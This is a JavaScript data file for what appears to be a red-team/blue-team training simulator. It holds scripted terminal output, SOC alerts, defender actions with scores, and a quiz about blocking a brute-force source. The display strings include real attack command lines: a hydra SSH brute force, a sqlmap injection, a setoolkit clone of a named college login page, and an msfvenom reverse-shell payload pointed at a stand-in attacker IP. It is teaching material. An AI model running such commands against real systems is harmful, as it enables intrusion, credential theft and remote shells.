export const TARGET_IP = '10.10.10.10'
export const ATTACKER_IP = '10.10.10.50'
export const BREACH_RESOLVE_SECONDS = 30

export const ATTACKER_TOOLS = [
  { id: 'recon', icon: '🔍', label: 'Reconnaissance' },
  { id: 'brute', icon: '🔑', label: 'Brute Force' },
  { id: 'web', icon: '🌐', label: 'Web Attack' },
  { id: 'phish', icon: '🎣', label: 'Phishing' },
  { id: 'malware', icon: '🦠', label: 'Malware Sim' },
  { id: 'scan', icon: '📡', label: 'Port Scan' },
  { id: 'exploit', icon: '💉', label: 'Exploit Sim' },
  { id: 'payload', icon: '📦', label: 'Custom Payload' },
]

export const ATTACK_BUTTONS = [
  { id: 'recon', label: 'START RECON', cmd: 'nmap -sV' },
  { id: 'brute', label: 'BRUTE FORCE', cmd: 'hydra -l admin' },
  { id: 'web', label: 'WEB ATTACK', cmd: 'sqlmap -u' },
  { id: 'phish', label: 'PHISHING', cmd: 'setoolkit' },
  { id: 'malware', label: 'MALWARE SIM', cmd: 'msfvenom -p' },
  { id: 'exploit', label: 'EXPLOIT', cmd: 'msfconsole' },
]

export const DEFENDER_ACTIONS = [
  { id: 'investigate', label: 'INVESTIGATE', icon: '🔎' },
  { id: 'block', label: 'BLOCK SOURCE', icon: '🚫', primary: true },
  { id: 'rate', label: 'ENABLE RATE LIMIT', icon: '⏱️' },
  { id: 'isolate', label: 'ISOLATE HOST', icon: '🔒' },
  { id: 'firewall', label: 'ADD FIREWALL RULE', icon: '🧱' },
  { id: 'reset', label: 'RESET PASSWORD', icon: '🔐' },
]

export const TIMELINE_STEPS = [
  { id: 'recon', label: 'Recon' },
  { id: 'discovery', label: 'Discovery' },
  { id: 'attack', label: 'Attack' },
  { id: 'detection', label: 'Detection' },
  { id: 'investigation', label: 'Investigation' },
  { id: 'response', label: 'Response' },
  { id: 'containment', label: 'Containment' },
]

export const NMAP_OUTPUT = [
  { text: 'root@kali:~# nmap -sV 10.10.10.10', delay: 0 },
  { text: 'Starting Nmap 7.94 ( https://nmap.org )', delay: 400 },
  { text: 'Nmap scan report for 10.10.10.10', delay: 800 },
  { text: 'Host is up (0.0012s latency).', delay: 1100 },
  { text: 'PORT     STATE SERVICE  VERSION', delay: 1400 },
  { text: '22/tcp   open  ssh      OpenSSH 8.9', delay: 1700 },
  { text: '80/tcp   open  http     Apache 2.4.52', delay: 2000 },
  { text: '443/tcp  open  ssl/http Apache 2.4.52', delay: 2300 },
  { text: '3306/tcp open  mysql    MySQL 8.0.32', delay: 2600 },
  { text: 'Nmap done: 1 IP address scanned in 2.41 seconds', delay: 2900 },
]

export const BRUTE_OUTPUT = [
  { text: 'root@kali:~# hydra -l admin -P wordlist.txt ssh://10.10.10.10', delay: 0 },
  { text: '[DATA] max 4 tasks per 1 server, 4 tasks total', delay: 300 },
  { text: '[22][ssh] host: 10.10.10.10   login: admin   password: admin123', delay: 1200 },
  { text: '[WARNING] Multiple failed attempts detected by target IDS...', delay: 1800 },
  { text: '[INFO] Demo mode — continuing attack simulation…', delay: 2400 },
  { text: '1 of 1 target successfully completed, 1 valid password found', delay: 3000 },
  { text: '', delay: 3300 },
  { text: 'root@kali:~# ssh admin@10.10.10.10', delay: 3600 },
  { text: "admin@10.10.10.10's password:", delay: 4000 },
  { text: 'Welcome to Ubuntu 22.04.3 LTS — DEFENDER SYSTEM (10.10.10.10)', delay: 4400 },
  { text: 'Last login: Mon Aug 17 14:53:41 2026 from 10.10.10.50', delay: 4700 },
  { text: 'admin@DEFENDER-SYSTEM:~$ whoami', delay: 5100 },
  { text: 'admin (DEFENDER SYSTEM)', delay: 5400 },
  { text: 'admin@DEFENDER-SYSTEM:~$ ls -la /var/www/html/', delay: 5800 },
  { text: 'total 48', delay: 6100 },
  { text: 'drwxr-xr-x  4 admin admin 4096 Aug 17 14:53 .', delay: 6300 },
  { text: 'drwxr-xr-x 12 root  root  4096 Aug 10 09:00 ..', delay: 6500 },
  { text: '-rw-r--r--  1 admin admin 2048 Aug 17 12:00 student_records.db', delay: 6700 },
  { text: '-rw-r--r--  1 admin admin  512 Aug 16 18:30 config.php', delay: 6900 },
  { text: '-rw-r--r--  1 admin admin 1024 Aug 15 11:00 backup_keys.pem', delay: 7100 },
  { text: 'drwxr-xr-x  2 admin admin 4096 Aug 17 10:00 uploads/', delay: 7300 },
  { text: '-rw-r--r--  1 admin admin 8942 Aug 14 08:00 college_logo.png', delay: 7500 },
  { text: '-rw-r--r--  1 admin admin 6521 Aug 14 08:00 campus_photo.jpg', delay: 7700 },
  { text: '-rw-r--r--  1 admin admin 3210 Aug 13 16:00 id_card_scan.png', delay: 7900 },
  { text: '-rw-r--r--  1 admin admin 1847 Aug 13 16:00 staff_photo.jpg', delay: 8100 },
  { text: '-rw-r--r--  1 admin admin  256 Aug 17 14:53 .bash_history', delay: 8300 },
  { text: '[+] ACCESS GRANTED — browsing DEFENDER SYSTEM files (demo)', delay: 8600 },
]

export const WEB_OUTPUT = [
  { text: `root@kali:~# sqlmap -u "http://${TARGET_IP}/login?id=1" --batch`, delay: 0 },
  { text: '[INFO] testing connection to the target URL', delay: 400 },
  { text: "Parameter: id (GET) — Type: boolean-based blind", delay: 900 },
  { text: '[CRITICAL] SQL injection vulnerability confirmed', delay: 1400 },
  { text: 'Database: mysql · Table: users · 847 entries dumped (sim)', delay: 1900 },
]

export const PHISH_OUTPUT = [
  { text: 'root@kali:~# setoolkit', delay: 0 },
  { text: '[1] Social-Engineering Attacks → [2] Website Attack Vectors', delay: 500 },
  { text: 'Cloning https://auxiliumcollege.ac.in/login (SIMULATION)', delay: 1000 },
  { text: 'Phishing server started on http://10.10.10.50:8080', delay: 1500 },
  { text: '[+] Credential captured: student@auxiliumcollege.ac.in (fake)', delay: 2000 },
]

export const MALWARE_OUTPUT = [
  { text: 'root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.50 -f exe', delay: 0 },
  { text: 'Payload size: 738 bytes · output: payload.exe (SIMULATION)', delay: 600 },
  { text: 'root@kali:~# sha256sum payload.exe', delay: 1100 },
  { text: 'a3f8c2...9b1e  payload.exe  [MALWARE SAMPLE — LAB ONLY]', delay: 1600 },
]

export const EXPLOIT_OUTPUT = [
  { text: 'root@kali:~# msfconsole -q', delay: 0 },
  { text: 'use exploit/linux/ssh/openssh_auth_bypass (SIM)', delay: 500 },
  { text: `set RHOSTS ${TARGET_IP} · set LHOST ${ATTACKER_IP}`, delay: 1000 },
  { text: '[*] Sending exploit payload…', delay: 1500 },
  { text: '[+] Session 1 opened — shell access simulated', delay: 2000 },
]

export const ATTACK_SEQUENCES = {
  recon: NMAP_OUTPUT,
  brute: BRUTE_OUTPUT,
  web: WEB_OUTPUT,
  phish: PHISH_OUTPUT,
  malware: MALWARE_OUTPUT,
  exploit: EXPLOIT_OUTPUT,
  scan: NMAP_OUTPUT,
}

export const SCENARIO_EVENTS = {
  recon: {
    phase: 'recon',
    timeline: ['recon', 'discovery'],
    alerts: [
      { level: 'medium', title: 'Suspicious Reconnaissance Detected', detail: `Port scan from ${ATTACKER_IP}` },
    ],
    logs: [
      { type: 'info', msg: 'Firewall log: SYN packets to multiple ports from external IP' },
      { type: 'log', msg: `IDS: Port scan signature matched — source ${ATTACKER_IP}` },
      { type: 'alert', msg: 'SIEM: Reconnaissance activity correlated — severity MEDIUM' },
    ],
    packets: { sent: 847, blocked: 12, allowed: 835 },
    traffic: 'recon',
    attackStatus: 'Reconnaissance Completed',
    attackProgress: 100,
  },
  brute: {
    phase: 'attack',
    timeline: ['recon', 'discovery', 'attack', 'detection'],
    alerts: [
      { level: 'medium', title: 'Suspicious Reconnaissance Detected', detail: `Port scan from ${ATTACKER_IP}` },
      { level: 'high', title: 'Multiple Failed Login Attempts', detail: `SSH brute-force from ${ATTACKER_IP}` },
      { level: 'high', title: 'Unauthorized SSH Login', detail: `Valid credentials used — user admin from ${ATTACKER_IP}` },
    ],
    logs: [
      { type: 'alert', msg: `[ALERT] SSH auth failure spike — 47 attempts in 30s from ${ATTACKER_IP}` },
      { type: 'log', msg: 'EDR: Credential stuffing pattern detected on port 22' },
      { type: 'action', msg: 'SOC Analyst: Escalated to Tier-2 — awaiting response action' },
      { type: 'alert', msg: `[CRITICAL] Successful SSH login — user admin from ${ATTACKER_IP}` },
      { type: 'action', msg: 'SOC: Immediate containment required — block source IP now' },
    ],
    packets: { sent: 1240, blocked: 89, allowed: 1151 },
    traffic: 'attack',
    attackStatus: 'SSH Access Gained (Demo)',
    attackProgress: 100,
  },
  breach: {
    phase: 'attack',
    alerts: [
      { level: 'critical', title: '🚨 SYSTEM HACKED', detail: 'Attacker has shell on DEFENDER SYSTEM — immediate response required' },
    ],
    logs: [
      { type: 'alert', msg: '[CRITICAL] SYSTEM COMPROMISED — unauthorized shell on DEFENDER SYSTEM' },
      { type: 'alert', msg: '[ALARM] Attacker browsing /var/www/html/ — sensitive files exposed' },
      { type: 'action', msg: `[URGENT] Block ${ATTACKER_IP} within ${BREACH_RESOLVE_SECONDS}s or system will crash (simulation)` },
    ],
    attackStatus: 'DEFENDER SYSTEM HACKED',
    attackProgress: 100,
  },
  crash: {
    phase: 'containment',
    alerts: [
      { level: 'critical', title: '💥 SYSTEM CRASH', detail: 'DEFENDER SYSTEM offline — defense failed within 30 seconds' },
    ],
    logs: [
      { type: 'alert', msg: '[FATAL] SYSTEM CRASH — all services terminated (simulation)' },
      { type: 'alert', msg: '[FATAL] Database unreachable · Web server down · SOC alert storm' },
      { type: 'alert', msg: '[POST-MORTEM] Incident response failed — trainer debrief required' },
    ],
    packets: { sent: 1240, blocked: 89, allowed: 1151 },
    traffic: 'attack',
    attackStatus: 'SYSTEM CRASH — Defense Failed',
    attackProgress: 100,
  },
  block: {
    phase: 'containment',
    timeline: ['recon', 'discovery', 'attack', 'detection', 'investigation', 'response', 'containment'],
    alerts: [
      { level: 'medium', title: 'Suspicious Reconnaissance Detected', detail: 'Contained' },
      { level: 'high', title: 'Multiple Failed Login Attempts', detail: 'Source blocked' },
      { level: 'low', title: 'Threat Contained Successfully', detail: `${ATTACKER_IP} added to deny list` },
    ],
    logs: [
      { type: 'action', msg: `[ACTION] Firewall rule added: DENY ALL from ${ATTACKER_IP}` },
      { type: 'info', msg: 'IDS: Attack traffic dropped — 0 packets allowed from blocked IP' },
      { type: 'info', msg: 'Incident closed — Time to Detect: 8s | Time to Respond: 5s' },
    ],
    packets: { sent: 1240, blocked: 1240, allowed: 0 },
    traffic: 'blocked',
    attackStatus: 'Attack Blocked',
    attackProgress: 100,
  },
  web: {
    phase: 'attack',
    timeline: ['recon', 'discovery', 'attack', 'detection'],
    alerts: [
      { level: 'high', title: 'SQL Injection Attempt Detected', detail: `Web attack on /login from ${ATTACKER_IP}` },
    ],
    logs: [
      { type: 'alert', msg: 'WAF: SQLi pattern blocked — UNION SELECT detected' },
      { type: 'log', msg: 'App log: Suspicious query parameter id=1 OR 1=1' },
      { type: 'action', msg: 'SOC: Web attack escalated — review OWASP A03 Injection' },
    ],
    packets: { sent: 980, blocked: 45, allowed: 935 },
    traffic: 'attack',
    attackStatus: 'Web Attack — SQLi In Progress',
    attackProgress: 80,
  },
  phish: {
    phase: 'attack',
    timeline: ['recon', 'attack', 'detection'],
    alerts: [
      { level: 'high', title: 'Phishing Site Detected', detail: 'Fake login page mimicking college portal' },
    ],
    logs: [
      { type: 'alert', msg: 'Email gateway: Suspicious link to 10.10.10.50:8080 blocked' },
      { type: 'log', msg: 'User reported phishing email — subject: "Urgent fee payment"' },
      { type: 'info', msg: 'Awareness: Never enter credentials on unknown links' },
    ],
    packets: { sent: 320, blocked: 280, allowed: 40 },
    traffic: 'attack',
    attackStatus: 'Phishing Campaign Active',
    attackProgress: 65,
  },
  malware: {
    phase: 'attack',
    timeline: ['attack', 'detection', 'investigation'],
    alerts: [
      { level: 'high', title: 'Malware Hash Detected', detail: 'Suspicious executable payload.exe (sim)' },
    ],
    logs: [
      { type: 'alert', msg: 'EDR: Unknown binary hash a3f8c2... quarantined on endpoint' },
      { type: 'log', msg: 'Sandbox: Reverse shell behavior detected — C2 to 10.10.10.50' },
      { type: 'action', msg: 'Analyst: Isolate host recommended' },
    ],
    packets: { sent: 560, blocked: 120, allowed: 440 },
    traffic: 'attack',
    attackStatus: 'Malware Payload Deployed (Sim)',
    attackProgress: 90,
  },
  exploit: {
    phase: 'attack',
    timeline: ['recon', 'discovery', 'attack', 'detection'],
    alerts: [
      { level: 'high', title: 'Exploit Attempt — SSH Service', detail: `Remote code execution try from ${ATTACKER_IP}` },
    ],
    logs: [
      { type: 'alert', msg: 'IPS: Exploit signature matched on port 22' },
      { type: 'log', msg: 'Honeypot: Attacker session logged for forensics' },
      { type: 'action', msg: 'Incident: Critical — immediate containment required' },
    ],
    packets: { sent: 1100, blocked: 95, allowed: 1005 },
    traffic: 'attack',
    attackStatus: 'Exploit Session Open (Sim)',
    attackProgress: 95,
  },
}

export const DEFENDER_RESPONSES = {
  investigate: {
    log: { type: 'action', msg: `[ACTION] Analyst investigating ${ATTACKER_IP} — WHOIS, geolocation, threat intel` },
    timelineAdd: 'investigation',
    score: 50,
  },
  block: { eventKey: 'block', score: 850 },
  rate: {
    log: { type: 'action', msg: '[ACTION] Rate limiting enabled on SSH — max 5 attempts/min per IP' },
    alerts: [{ level: 'low', title: 'Rate Limit Applied', detail: 'Brute-force slowed — monitor for bypass' }],
    packets: { sent: 1240, blocked: 200, allowed: 1040 },
    attackProgress: 50,
    attackStatus: 'Attack Rate-Limited',
    timelineAdd: 'response',
    score: 100,
  },
  isolate: {
    log: { type: 'action', msg: '[ACTION] Host 10.10.10.10 isolated to quarantine VLAN' },
    alerts: [{ level: 'medium', title: 'Host Isolated', detail: 'Server moved to quarantine segment' }],
    traffic: 'blocked',
    attackProgress: 60,
    attackStatus: 'Host Isolated — Partial Containment',
    timelineAdd: 'containment',
    score: 200,
  },
  firewall: {
    log: { type: 'action', msg: `[ACTION] Firewall rule: DENY ${ATTACKER_IP} → ANY` },
    alerts: [{ level: 'low', title: 'Firewall Rule Added', detail: `Block rule for ${ATTACKER_IP}` }],
    packets: { sent: 1240, blocked: 500, allowed: 740 },
    timelineAdd: 'response',
    score: 150,
  },
  reset: {
    log: { type: 'action', msg: '[ACTION] Admin password reset · MFA re-enrolled · sessions revoked' },
    alerts: [{ level: 'low', title: 'Credentials Reset', detail: 'Compromised account secured' }],
    timelineAdd: 'response',
    score: 75,
  },
}

export const QUIZ = {
  question: 'Multiple failed login attempts detected from a single IP. What should the defender do next?',
  options: [
    { id: 'a', label: 'Ignore — might be a user typo' },
    { id: 'b', label: 'Block source IP at firewall immediately', correct: true },
    { id: 'c', label: 'Disable all SSH access globally' },
    { id: 'd', label: 'Email the attacker to stop' },
  ],
  explain: 'Block the malicious source IP first to stop ongoing brute-force while you investigate.',
}
